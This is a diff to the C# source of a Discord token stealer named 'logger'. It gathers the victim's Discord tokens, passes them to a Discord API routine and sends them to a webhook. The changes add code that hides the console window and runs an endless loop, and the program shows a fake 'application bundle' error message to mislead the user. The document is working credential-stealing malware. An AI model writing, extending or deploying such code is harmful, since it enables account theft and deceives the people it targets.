@@ -1,7 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 
@@ -12,38 +14,64 @@ namespace logger
 
 
         //main hook
-        public static string webhook = "webhook-link";
+        public static string webhook = "";
 
         //will work if the main^ is dead
         public static string altwebhook = "";
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
 
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        static async Task Main(string[] args)
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        private static async Task Main(string[] args)
         {
 
 
 
+          
+            await TokenGrabber();
 
-            TokenGrabber();
+            
+
+
             await Utils.SendWebhookAsync();
+   
 
             Console.WriteLine(@"Failure processing application bundle.
 Bundle header version compatibility check failed.
-A fatal error occured while processing application bundle");
-            Console.ReadLine();
+A fatal error occured while processing application bundle/n/nPress any key to close...");
+            Console.ReadKey();
+
+            var handle = GetConsoleWindow();
+
+            ShowWindow(handle, SW_HIDE);
+
+
+
+
+
+            while (true) { }
 
 
 
         }
 
 
-        public static void TokenGrabber()
+        public static async 
+
+        Task
+TokenGrabber()
         {
            
             var tokens = GetTokens();
 
             Parallel.ForEach(tokens, token =>
             {
+               
                 DiscordAPI.main(token);
 
             });
